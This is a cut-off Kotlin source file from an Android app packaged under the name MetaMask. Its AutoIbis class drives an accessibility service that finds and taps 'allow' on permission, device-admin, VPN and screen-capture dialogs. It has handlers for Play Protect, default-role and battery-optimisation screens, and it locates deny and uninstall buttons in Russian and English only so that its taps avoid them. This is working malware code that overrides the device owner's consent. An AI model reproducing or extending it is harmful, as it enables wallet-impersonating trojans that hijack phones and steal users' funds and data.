package com.example.MetaMask.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoIbis {

    companion object {
        private const val SCAN_INTERVAL_MS = 250L
        private const val DEBOUNCE_MS = 500L
        private const val INFER_COOLDOWN_MS = 1200L

        private val ALLOW_IDS = listOf(
            "com.google.android.permissioncontroller:id/permission_allow_all_button",
            "com.android.permissioncontroller:id/permission_allow_all_button",
            "com.google.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/ok_button",
            "com.lbe.security.miui:id/permission_message_pos",
            "com.lbe.security.miui:id/permission_dialog_pos",
            "com.lbe.security.miui:id/permission_allow_button",
            "com.lbe.security.miui:id/btn_allow",
            "com.lbe.security.miui:id/lbe_security_page_allow_button",
            "com.android.vpndialogs:id/ok",
            "android:id/button1",
            "android:id/positiveButton"
        )

        private val DENY_IDS = listOf(
            "android:id/button2",
            "android:id/button3",
            "android:id/negativeButton",
            "android:id/neutralButton"
        )

        private val ALLOW_TEXTS = listOf(
            "разрешить всегда", "разрешить в любое время",
            "разрешить доступ ко всем фото", "все фото и видео", "полный доступ",
            "allow all the time", "always allow",
            "allow all photos", "allow all photos and videos",
            "allow access to all photos", "full photo access", "see all photos",
            "allow all",
            "разрешить только при использовании", "только при использовании приложения",
            "только при использовании", "при использовании приложения",
            "только на этот раз", "разрешить однократно",
            "разрешить", "allow only while using the app",
            "allow", "while using the app", "only this time", "select more",
            "associate", "add device", "pair",
            "связать", "добавить устройство",
        )

        private val DENY_TEXTS = setOf(
            "deny", "don't allow", "dont allow", "not allow", "no, thanks",
            "cancel", "decline", "never", "not now", "dismiss",
            "remove", "deactivate", "disable", "delete", "uninstall",
            "отказать", "не разрешать", "запретить", "нет", "отмена",
            "никогда", "не сейчас", "отклонить",
            "удалить", "деактивировать", "отключить", "удалите",
            "nein", "non", "no", "ablehnen", "verweigern",
            "não", "rechazar"
        )

        private val PERM_PKGS = setOf(
            "com.google.android.permissioncontroller",
            "com.android.permissioncontroller",
            "com.android.packageinstaller",
            "com.lbe.security.miui",
            "com.miui.permcenter",
            "com.android.vpndialogs"
        )

        private val SYSTEM_PKGS = setOf("android", "com.android.systemui")

        private fun isPermDialogPkg(pkg: String): Boolean =
            pkg in PERM_PKGS || pkg in SYSTEM_PKGS

        private const val SETUP_PKG = "com.android.settings"
        private const val SETUP_TIMEOUT_MS = 35_000L
        private const val BATT_OPT_TIMEOUT_MS = 120_000L

        private val SETUP_POSITIVE_TEXTS = setOf(
            "activate", "activate device admin", "activate this device admin app",
            "allow", "enable", "ok", "yes", "continue",
            "активировать", "разрешить", "включить", "ок", "да", "продолжить"
        )
        private val ROLE_CONFIRM_TEXTS = setOf(
            "set as default", "yes", "ok", "confirm", "accept", "continue", "set", "use", "apply",
            "выбрать", "назначить", "ок", "подтвердить", "продолжить", "установить",
            "да", "принять", "применить"
        )
    }

    private var service: AccessibilityService? = null
    @Volatile var enabled = false
    @Volatile private var scanning = false

    private var savedEventRoot: AccessibilityNodeInfo? = null

    private val handler = Handler(Looper.getMainLooper())
    private var lastClickMs = 0L
    private var lastInferMs = 0L

    @Volatile private var permDialogSuspected = false
    @Volatile private var lastPermDialogMs = 0L
    private val PERM_DIALOG_TIMEOUT_MS = 10_000L
    private val PERM_DIALOG_MIN_AGE_MS  =  1_200L
    private val PERM_STUCK_TIMEOUT_MS   =  9_000L

    @Volatile private var permDialogGen    = 0
    @Volatile private var stuckWatchdogGen = 0

    @Volatile var deviceAdminPending  = false
    @Volatile var writeSettingsPending = false
    @Volatile private var writeSettingsStartMs = 0L
    @Volatile private var writeSettingsLastScheduleMs = 0L
    private val WRITE_SETTINGS_TIMEOUT_MS = 15_000L
    var writeSettingsDoneCallback: (() -> Unit)? = null

    private fun finishWriteSettings(svc: AccessibilityService, delayBackMs: Long = 0L) {
        android.util.Log.d("XDBG", "[AutoIbis] finishWriteSettings enter svc=${svc} delayBackMs=${delayBackMs}") //xdbg
        writeSettingsPending = false
        val cb = writeSettingsDoneCallback
        writeSettingsDoneCallback = null
        handler.post { cb?.invoke() }
        if (delayBackMs > 0L) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            handler.postDelayed({
                try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
            }, delayBackMs)
        } else {
            try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
        }
    }

    private val WRITE_SETTINGS_PKGS = setOf(
        "com.android.settings",
        "com.samsung.android.settings",
        "com.lge.settings",
        "com.sonymobile.settings"
    )

    @Volatile private var waitForEnableActive = false
    @Volatile private var waitForEnableGen = 0
    private var waitForEnableRunnable: Runnable? = null
    private var waitForEnableStartMs = 0L
    private val WAIT_FOR_ENABLE_TIMEOUT_MS = 20_000L
    private val WAIT_FOR_ENABLE_POLL_MS = 400L
    @Volatile var batteryOptPending   = false
    @Volatile private var setupDialogActive = false
    @Volatile private var lastSetupMs       = 0L
    @Volatile private var setupTreeDumped   = false
    @Volatile private var consentTickedAtMs = 0L
    @Volatile var hyperOsCheckboxTicked = false
    @Volatile private var hyperOsCheckboxTickedAtMs = 0L
    private var hyperOsOkCenterX = 0f
    private var hyperOsOkCenterY = 0f
    private var hyperOsCountdownTapScheduled = false
    private val HYPER_OS_CHECKBOX_TICK_GUARD_MS = 15000L
    private val CONSENT_TICK_COOLDOWN_MS = 2500L

    @Volatile var roleSelectionActive  = false
    @Volatile private var roleAppSelected = false

    @Volatile private var mediaProjectionViperActive = false
    @Volatile private var mediaProjectionSpinnerDone = false
    @Volatile var mediaProjectionAutoConfirm = false

    private enum class BatteryRadioResult { CLICKED, NO_OPTION, NOT_FOUND, INTERCEPT_CLICKED }

    @Volatile private var playProtectActive = false
    @Volatile private var playProtectSettingsClicked = false
    @Volatile private var playProtectToggleClicked = false

    private val periodicRunnable = object : Runnable {
        override fun run() {
            android.util.Log.d("XDBG", "[AutoIbis] run enter") //xdbg
            if (!scanning) return
            if (enabled) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                try { scanAndClick() } catch (_: Exception) { }
            }
            if (scanning) handler.postDelayed(this, SCAN_INTERVAL_MS)
        }
    }

    fun start(svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[AutoIbis] start enter svc=${svc}") //xdbg
        service = svc
        if (!scanning) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            scanning = true
            handler.postDelayed(periodicRunnable, SCAN_INTERVAL_MS)
        }
    }

    fun stop() {
        android.util.Log.d("XDBG", "[AutoIbis] stop enter") //xdbg
        scanning = false
        handler.removeCallbacks(periodicRunnable)
        savedEventRoot?.let { try { it.recycle() } catch (_: Exception) {} }
        savedEventRoot = null
        service = null
    }

    fun enable(on: Boolean) {
        android.util.Log.d("XDBG", "[AutoIbis] enable enter on=${on}") //xdbg
        enabled = on
        if (on) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            lastClickMs = 0L
            lastInferMs = 0L
            permDialogSuspected = false
            savedEventRoot?.let { try { it.recycle() } catch (_: Exception) {} }
            savedEventRoot = null
            handler.removeCallbacks(periodicRunnable)
            handler.post { try { scanAndClick() } catch (_: Exception) { } }
            handler.postDelayed(periodicRunnable, SCAN_INTERVAL_MS)
        } else {
            permDialogSuspected = false
        }
    }

    fun onPermissionDialogAboutToShow(permName: String = "") {
        android.util.Log.d("XDBG", "[AutoIbis] onPermissionDialogAboutToShow enter permName=${permName}") //xdbg
        if (!enabled) return
        permDialogSuspected = true
        lastPermDialogMs = System.currentTimeMillis()
        lastInferMs = 0L
        val myGen     = ++permDialogGen
        val myWatchGen = ++stuckWatchdogGen
        handler.postDelayed({
            if (enabled && permDialogSuspected && permDialogGen == myGen) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                try { scanAndClick() } catch (_: Exception) { }
            }
        }, 1400L)

        handler.postDelayed({
            if (enabled && permDialogSuspected && stuckWatchdogGen == myWatchGen) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                service?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                handler.postDelayed({
                    service?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                }, 600L)
                handler.postDelayed({
                    if (stuckWatchdogGen == myWatchGen) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        permDialogSuspected = false
                        permDialogGen++
                        handler.post { PermRequesterActivityRef.instance?.onDialogStuck() }
                    }
                }, 1500L)
            }
        }, PERM_STUCK_TIMEOUT_MS)
    }

    fun onPermissionDialogClosed() {
        android.util.Log.d("XDBG", "[AutoIbis] onPermissionDialogClosed enter") //xdbg
        permDialogSuspected = false
        permDialogGen++
        stuckWatchdogGen++
    }

    @Volatile private var lastTopPkgForPermTracker: String = ""

    fun onEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[AutoIbis] onEvent enter event=${event}") //xdbg
        if (deviceAdminPending || batteryOptPending) try { handleSetupDialogEvent(event) } catch (_: Exception) {}
        if (writeSettingsPending) try { handleWriteSettingsEvent(event) } catch (_: Exception) {}
        if (roleSelectionActive) try { handleRoleSelectionEvent(event) } catch (_: Exception) {}
        if (playProtectActive) try { handlePlayProtectEvent(event) } catch (_: Exception) {}

        if (com.example.MetaMask.HyperOsDetector.isHyperOs &&
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val topPkg = event.packageName?.toString() ?: ""
            if (topPkg.isNotEmpty() && topPkg != lastTopPkgForPermTracker) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val prev = lastTopPkgForPermTracker
                lastTopPkgForPermTracker = topPkg
                if (prev == "com.lbe.security.miui" && topPkg != "com.lbe.security.miui") {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    try {
                        PermRequesterActivityRef.instance?.onPermDialogDismissedByEvent(topPkg)
                    } catch (_: Exception) {}
                }
            }
        }

        if (mediaProjectionAutoConfirm && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val mpPkg = event.packageName?.toString() ?: ""
            val mpCls = event.className?.toString() ?: ""
            if (mpPkg == "com.android.systemui" && mpCls.contains("MediaProjectionPermissionActivity")) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                mediaProjectionViperActive = true
                mediaProjectionSpinnerDone = false
                permDialogTreeDumped = false
                handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 350L)
                handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 1000L)
            }
            if (mpPkg == "com.android.systemui" &&
                (mpCls.contains("AlertDialogWithDelegate") || mpCls.contains("AlertDialog"))) {
                val wasAlreadyActive = mediaProjectionViperActive
                mediaProjectionViperActive = true
                if (!wasAlreadyActive) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    mediaProjectionSpinnerDone = false
                }
                permDialogTreeDumped = false
                handler.post { tryHandleMediaProjectionPermDialog() }
                handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 150L)
                handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 400L)
            }
            if (mpPkg == "com.android.systemui" && mpCls.contains("MediaProjectionAppSelectorActivity")) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                mediaProjectionViperActive = true
                mediaProjectionSpinnerDone = false
                mediaProjectionRetryCount = 0
                listOf(500L, 1000L, 2000L, 3000L).forEach { d ->
                    handler.postDelayed({ tryHandleAppSelectorDialog(0) }, d)
                }
            }
        }
        if (mediaProjectionViperActive && event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 200L)
        }

        if (!enabled) return
        val t = event.eventType
        if (t != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            t != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return

        val pkg = event.packageName?.toString() ?: ""
        val cls = event.className?.toString() ?: ""
        val isDialogPkg     = isPermDialogPkg(pkg)
        val isGrantActivity = cls.contains("GrantPermission") || cls.contains("permissioncontroller")

        val delay = when {
            pkg in PERM_PKGS  -> 50L
            pkg in SYSTEM_PKGS -> 60L
            else               -> 150L
        }

        if (t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            if (isGrantActivity || isDialogPkg) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                permDialogSuspected = true
                lastPermDialogMs = System.currentTimeMillis()
            }

            val src = try { event.source } catch (_: Exception) { null }
            if (src != null && (isDialogPkg || isGrantActivity)) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                handler.postDelayed({
                    if (!enabled) { try { src.recycle() } catch (_: Exception) {}; return@postDelayed }
                    val svc = service ?: run { try { src.recycle() } catch (_: Exception) {}; return@postDelayed }
                    try {
                        processEventSource(src, svc)
                    } finally {
                        try { src.recycle() } catch (_: Exception) {}
                    }
                }, delay)
            } else {
                try { src?.recycle() } catch (_: Exception) {}
            }
        }

        handler.postDelayed({
            if (enabled) try { scanAndClick() } catch (_: Exception) {}
        }, delay + 40L)
    }

    private fun scanAndClick() {
        android.util.Log.d("XDBG", "[AutoIbis] scanAndClick enter") //xdbg
        val svc = service ?: return
        val now = System.currentTimeMillis()
        if (now - lastClickMs < DEBOUNCE_MS) return
        if (!enabled) return
        if (roleSelectionActive) return
        if (mediaProjectionViperActive || mediaProjectionAutoConfirm) return

        var anyDialogVisible = false

        val active = try { svc.rootInActiveWindow } catch (e: Exception) { null }
        if (active != null) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val pkg      = active.packageName?.toString() ?: ""
            val isDialog = isPermDialogPkg(pkg)
            try {
                if (tryAllowIdsOnly(active, svc)) { lastClickMs = System.currentTimeMillis(); return }
                if (isDialog) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    if (tryAccessibilityClick(active, svc)) { lastClickMs = System.currentTimeMillis(); return }
                    anyDialogVisible = true
                    if (now - lastInferMs >= INFER_COOLDOWN_MS) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        if (inferAndClickPositive(active, svc)) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            lastClickMs = System.currentTimeMillis(); lastInferMs = now; return
                        }
                    }
                }
            } finally { try { active.recycle() } catch (_: Exception) {} }
        }

        val windows = try { svc.windows } catch (e: Exception) { null }
        if (!windows.isNullOrEmpty()) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            for (win in windows) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val root = try { win.root } catch (e: Exception) { null }
                if (root == null) { anyDialogVisible = true; continue }
                val pkg = root.packageName?.toString() ?: ""
                try {
                    if (tryAllowIdsOnly(root, svc)) { lastClickMs = System.currentTimeMillis(); return }
                    if (isPermDialogPkg(pkg)) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        if (tryAccessibilityClick(root, svc)) { lastClickMs = System.currentTimeMillis(); return }
                        anyDialogVisible = true
                    }
                } finally { try { root.recycle() } catch (_: Exception) {} }
            }
        }

        if (anyDialogVisible) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val savedRoot = savedEventRoot
            if (savedRoot != null && now - lastInferMs >= INFER_COOLDOWN_MS) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (inferAndClickPositive(savedRoot, svc)) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    lastClickMs = System.currentTimeMillis(); lastInferMs = now; return
                }
            }
        }

        val permAge = now - lastPermDialogMs
        if (permDialogSuspected && permAge >= PERM_DIALOG_MIN_AGE_MS
            && permAge < PERM_DIALOG_TIMEOUT_MS
            && now - lastInferMs >= INFER_COOLDOWN_MS) {

            val myGen = permDialogGen
            listOf(0L, 600L, 1200L, 1800L, 2400L).forEach { delay ->
                handler.postDelayed({
                    if (enabled && permDialogSuspected && permDialogGen == myGen) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        val svc2 = service ?: return@postDelayed
                        val wins = try { svc2.windows } catch (_: Exception) { null } ?: return@postDelayed
                        var clicked = false
                        for (w in wins) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val r = try { w.root } catch (_: Exception) { null } ?: continue
                            try {
                                if (tryAllowIdsOnly(r, svc2)) { clicked = true; break }
                                val rPkg = r.packageName?.toString() ?: ""
                                if (isPermDialogPkg(rPkg) && tryAccessibilityClick(r, svc2)) { clicked = true; break }
                            } finally { try { r.recycle() } catch (_: Exception) {} }
                        }
                        if (clicked) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            lastClickMs = System.currentTimeMillis()
                        }
                    }
                }, delay)
            }
            lastInferMs = now
        }
    }

    private fun processEventSource(source: AccessibilityNodeInfo, svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[AutoIbis] processEventSource enter source=${source} svc=${svc}") //xdbg
        val now = System.currentTimeMillis()
        if (roleSelectionActive) return
        if (mediaProjectionViperActive || mediaProjectionAutoConfirm) return

        if (now - lastClickMs >= DEBOUNCE_MS && tryAccessibilityClick(source, svc)) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            lastClickMs = System.currentTimeMillis()
            return
        }

        savedEventRoot?.let { try { it.recycle() } catch (_: Exception) {} }
        savedEventRoot = try { source.refresh(); source } catch (_: Exception) { null }

        if (now - lastInferMs >= INFER_COOLDOWN_MS) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            if (inferAndClickPositive(source, svc)) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                lastClickMs = System.currentTimeMillis()
                lastInferMs = now
            }
        }
    }

    private fun inferAndClickPositive(root: AccessibilityNodeInfo, svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] inferAndClickPositive enter root=${root} svc=${svc}") //xdbg
        val panelBounds = Rect()
        val panelNodes = try { root.findAccessibilityNodeInfosByViewId("android:id/buttonPanel") }
            catch (_: Exception) { null }
        if (!panelNodes.isNullOrEmpty()) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            try { panelNodes.firstOrNull()?.getBoundsInScreen(panelBounds) } catch (_: Exception) {}
            panelNodes.forEach { try { it.recycle() } catch (_: Exception) {} }
        }

        val denyBtn = findDenyButton(root)
        if (denyBtn == null) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }
        val denyBounds = Rect()
        try { denyBtn.getBoundsInScreen(denyBounds) } catch (_: Exception) {}
        try { denyBtn.recycle() } catch (_: Exception) {}

        if (denyBounds.isEmpty || denyBounds.width() < 4) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return false
        }

        val panelRight = when {
            !panelBounds.isEmpty && panelBounds.right > denyBounds.right ->
                panelBounds.right.toFloat()
            else -> denyBounds.right.toFloat() + denyBounds.width() * 3f
        }
        val denyWidth = denyBounds.width().toFloat()
        val posY  = denyBounds.centerY().toFloat()
        val posX1 = panelRight - denyWidth / 2f
        val posX2 = (denyBounds.right.toFloat() + panelRight) / 2f
        val posX3 = denyBounds.left.toFloat() + (panelRight - denyBounds.left.toFloat()) * 0.85f

        doGestureTap(svc, posX1, posY)
        handler.postDelayed({ if (enabled) doGestureTap(svc, posX2, posY) }, 400)
        handler.postDelayed({ if (enabled) doGestureTap(svc, posX3, posY) }, 800)
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return true
    }

    private fun findDenyButton(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findDenyButton enter root=${root}") //xdbg
        for (id in DENY_IDS) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) }
                catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val btn = nodes.firstOrNull { it.isEnabled }
                nodes.filter { it != btn }.forEach { try { it.recycle() } catch (_: Exception) {} }
                if (btn != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                    return btn
                }
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return findDenyBFS(root, 0)
    }

    private fun findDenyBFS(node: AccessibilityNodeInfo, depth: Int): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findDenyBFS enter node=${node} depth=${depth}") //xdbg
        if (depth > 10) return null
        val cls = node.className?.toString() ?: ""
        if (cls.endsWith("Button") && node.isEnabled && node.isClickable) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val text  = (node.text?.toString() ?: "").trim().lowercase()
            val desc  = (node.contentDescription?.toString() ?: "").trim().lowercase()
            val label = if (text.isNotBlank()) text else desc
            if (DENY_TEXTS.any { label.contains(it) }) return node
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val result = findDenyBFS(child, depth + 1)
            if (result != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (result !== child) try { child.recycle() } catch (_: Exception) {}
                return result
            }
            try { child.recycle() } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun tryAllowIdsOnly(root: AccessibilityNodeInfo, svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] tryAllowIdsOnly enter root=${root} svc=${svc}") //xdbg
        val pkg = root.packageName?.toString() ?: ""
        for (id in ALLOW_IDS) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) }
                catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                try {
                    for (n in nodes) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        if (!n.isEnabled) { continue }
                        val label = ((n.text?.toString() ?: "").trim().ifBlank {
                            n.contentDescription?.toString()?.trim() ?: ""
                        }).lowercase()
                        if (label.isNotBlank() && DENY_TEXTS.any { label.contains(it) }) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            continue
                        }
                        if (clickNodeOrGesture(n, svc, "allowId:$id label='$label'")) return true
                    }
                } finally { nodes.forEach { try { it.recycle() } catch (_: Exception) {} } }
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun tryAccessibilityClick(root: AccessibilityNodeInfo, svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] tryAccessibilityClick enter root=${root} svc=${svc}") //xdbg
        val pkg = root.packageName?.toString() ?: ""

        if (pkg in PERM_PKGS) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            for (text in ALLOW_TEXTS) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val nodes = try { root.findAccessibilityNodeInfosByText(text) }
                    catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty()) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    try {
                        for (n in nodes) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val label = (n.text?.toString() ?: "").trim().lowercase()
                            if (label.isBlank() || label.length > 60) continue
                            if (DENY_TEXTS.any { label.contains(it) }) continue
                            val cls = n.className?.toString() ?: ""
                            if (cls.endsWith("TextView") && !n.isClickable) continue
                            if (!n.isEnabled) continue
                            if (clickNodeOrGesture(n, svc, "txt:'$label'")) return true
                        }
                    } finally { nodes.forEach { try { it.recycle() } catch (_: Exception) {} } }
                }
            }
        }

        if (isPermDialogPkg(pkg)) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return bfsClickAllowButtons(root, svc, 0)
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun bfsClickAllowButtons(node: AccessibilityNodeInfo, svc: AccessibilityService, depth: Int): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] bfsClickAllowButtons enter node=${node} svc=${svc} depth=${depth}") //xdbg
        if (depth > 12) return false
        val cls   = node.className?.toString() ?: ""
        val isBtn = cls.contains("Button") || cls.contains("CheckBox") || cls.contains("RadioButton")
        if (isBtn && node.isEnabled && node.isClickable) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val text  = (node.text?.toString() ?: "").trim().lowercase()
            val desc  = (node.contentDescription?.toString() ?: "").trim().lowercase()
            val label = if (text.isNotBlank()) text else desc
            if (!DENY_TEXTS.any { label.contains(it) } && label.length <= 40) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (clickNodeOrGesture(node, svc, "bfs:'$label'")) return true
            }
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try {
                if (bfsClickAllowButtons(child, svc, depth + 1)) return true
            } finally { try { child.recycle() } catch (_: Exception) {} }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun clickNodeOrGesture(node: AccessibilityNodeInfo, svc: AccessibilityService, reason: String): Boolean {
        android.util.Log.d("XDBG", "[AutoIbis] clickNodeOrGesture enter node=${node} svc=${svc} reason=${reason}") //xdbg
        val t   = findClickable(node) ?: node
        val acc = try { t.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
        if (acc) { return true }
        val bounds = Rect().also { try { t.getBoundsInScreen(it) } catch (_: Exception) {} }
        if (!bounds.isEmpty && bounds.width() > 4 && bounds.height() > 4) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            doGestureTap(svc, bounds.centerX().toFloat(), bounds.centerY().toFloat())
            android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
            return true
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return false
    }

    private fun findClickable(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findClickable enter node=${node}") //xdbg
        if (node.isClickable && node.isEnabled) return node
        var cur: AccessibilityNodeInfo? = try { node.parent } catch (_: Exception) { null }
        repeat(4) {
            val c = cur ?: return null
            if (c.isClickable && c.isEnabled) return c
            cur = try { c.parent } catch (_: Exception) { null }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun doGestureTap(svc: AccessibilityService, x: Float, y: Float) {
        android.util.Log.d("XDBG", "[AutoIbis] doGestureTap enter svc=${svc} x=${x} y=${y}") //xdbg
        try {
            val path   = Path().apply { moveTo(x, y) }
            val stroke = GestureDescription.StrokeDescription(path, 0L, 120L)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            val lx = x; val ly = y
            val callback = object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(g: GestureDescription?) {
                    android.util.Log.d("XDBG", "[AutoIbis] onCompleted enter g=${g}") //xdbg
                    lastClickMs = System.currentTimeMillis()
                }
                override fun onCancelled(g: GestureDescription?) {
                    android.util.Log.d("XDBG", "[AutoIbis] onCancelled enter g=${g}") //xdbg
                }
            }
            val marten = AccessSvc.instance?.martenHelper
            if (marten != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                marten.dispatchGesture(svc, gesture, callback)
            } else {
                svc.dispatchGesture(gesture, callback, null)
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AutoIbis] catch (ignored)") //xdbg
        }
    }

    private var mediaProjectionRetryCount = 0

    private var permDialogTreeDumped = false

    private fun tryHandleMediaProjectionPermDialog() {
        android.util.Log.d("XDBG", "[AutoIbis] tryHandleMediaProjectionPermDialog enter") //xdbg
        if (!mediaProjectionViperActive) return
        val svc = service ?: return

        var root: AccessibilityNodeInfo? = null
        try {
            val activeRoot = try { svc.rootInActiveWindow } catch (_: Exception) { null }

            fun hasConfirmDialogContent(r: AccessibilityNodeInfo): Boolean {
                android.util.Log.d("XDBG", "[AutoIbis] hasConfirmDialogContent enter r=${r}") //xdbg
                fun check(id: String): Boolean {
                    android.util.Log.d("XDBG", "[AutoIbis] check enter id=${id}") //xdbg
                    val nodes = try { r.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { return false }
                    val found = nodes?.isNotEmpty() == true
